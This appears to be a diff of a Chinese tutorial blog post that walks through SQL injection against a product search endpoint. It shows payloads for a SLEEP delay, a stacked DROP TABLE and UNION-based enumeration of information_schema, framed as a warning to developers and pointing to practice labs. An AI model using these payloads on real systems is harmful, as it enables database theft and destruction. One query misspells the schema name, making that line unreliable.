@@ -12,7 +12,7 @@ category: 技术
 
 WEB技术发展日新月异，但是徒手拼SQL的传统手艺还是受相当多的开发者亲睐。毕竟相比于再去学习一套复杂的[ORM](https://en.wikipedia.org/wiki/Object-relational_mapping)规则，手拼更说方便，直观。通常自己拼SQL的人，应该是有听说过**SQL注入**很危险，但是总是心想：我的SQL语句这么简单，不可能被注入的。
 
-花5分钟看完这个完整的例子，从今往后应该再也不敢有以上侥幸心理了。
+花3分钟看懂这个完整的例子，从今往后应该再也不会手拼SQL啦。
 
 ### 简单场景
 
@@ -57,7 +57,7 @@ select ? from ? where ? Like '%'; -- %';
 紧紧抓住上一步中可以扩展的单引号部分。来一个简单的延时语句试一试:
 
 ```sql
-select ? from ? where ? Like '%Hammer' and 1 = SLEEP(2); -- %';  
+select ? from ? where ? Like '%Hammer%' and 1 = SLEEP(2); -- %';  
 ```
 
 这时查询会2秒后才返回结果，如果把时间延长，用脚本多点几次查询，一下就能把数据库的连接池用完。
@@ -65,7 +65,7 @@ select ? from ? where ? Like '%Hammer' and 1 = SLEEP(2); -- %';
 当然，还有破坏力更强的！
 
 ```sql
-select ? from ? where ? Like '%Hammer'; drop table xxxx; -- %'; 
+select ? from ? where ? Like '%Hammer%'; drop table xxxx; -- %'; 
 ```
 
 可以直接把表/数据库直接删除掉，至于如何知道引数据库中有哪一些表(即如何确定上句SQL中的`xxxx`)呢？
@@ -77,7 +77,7 @@ select ? from ? where ? Like '%Hammer'; drop table xxxx; -- %';
 使用`union`可以把不同表的内容拼在一起，小试一下：
 
 ```sql
-select ?,?,?,? from ? where ? Like '%hammer' UNION (select 1,2,3,4 from dual); -- %';  
+select ?,?,?,? from ? where ? Like '%Hammer%' UNION (select 1,2,3,4 from dual); -- %';  
 ```
 
 | 产品        | 价格  | 生产地   | 生产日期   |
@@ -91,7 +91,7 @@ select ?,?,?,? from ? where ? Like '%hammer' UNION (select 1,2,3,4 from dual); -
 Mysql系统自带的信息都存在`information_schema`数据库中。我们试着在里面找找有用的信息。
 
 ```sql
-select ? from ? where ? Like '%hammer' UNION (select TABLE_NAME,TABLE_SCHEMA,3,4 from information_schema.tables); --%';  
+select ? from ? where ? Like '%Hammer%' UNION (select TABLE_NAME,TABLE_SCHEMA,3,4 from information_schema.tables); --%';  
 ```
 
 | 产品        | 价格    | 生产地   | 生产日期   |
@@ -108,7 +108,7 @@ select ? from ? where ? Like '%hammer' UNION (select TABLE_NAME,TABLE_SCHEMA,3,4
 看着列表一猜就能知道我们目前查的是products表，接下来我们再把products具体的字段也挖出来。
 
 ```sql
-select ? from ? where ? Like '%hammer' UNION (select COLUMN_NAME,TABLE_SCHEMA,3,4 from imformation_schema.columns where table_name = 'products'); -- %';  
+select ? from ? where ? Like '%Hammer%' UNION (select COLUMN_NAME,TABLE_SCHEMA,3,4 from imformation_schema.columns where table_name = 'products'); -- %';  
 ```
 
 | 产品        | 价格    | 生产地   | 生产日期   |
@@ -124,24 +124,12 @@ select ? from ? where ? Like '%hammer' UNION (select COLUMN_NAME,TABLE_SCHEMA,3,
 所以，通过上面2步，我们知道了表名和字段名，那么查询API的完整SQL应该是(把上面的`?`都补全啦)：
 
 ```sql
-select name,price,address,updated_at from products where name like '%hammer';
+select name,price,address,updated_at from products where name like '%Hammer%';
 ```
 
 通过不断重复以上几个步骤，你就可以通过这一个小小的入口把数据库的所有信息(比如上面发现的`user`表🤤)都翻个遍。
 
-
-
 注意：以上都是在自己的机器上尝试的，千万不要越界去hack别人家的服务器！
 
 如果你SQL注入想要更深入/系统的学习，可以使用当然你可以自己本地搭建[DVWA](https://github.com/ethicalhack3r/DVWA)，或挑战[HackMe-SQL-Injection-Challenges](https://github.com/breakthenet/HackMe-SQL-Injection-Challenges)。
-
-
-
-
-
-
-
-
-
-
 
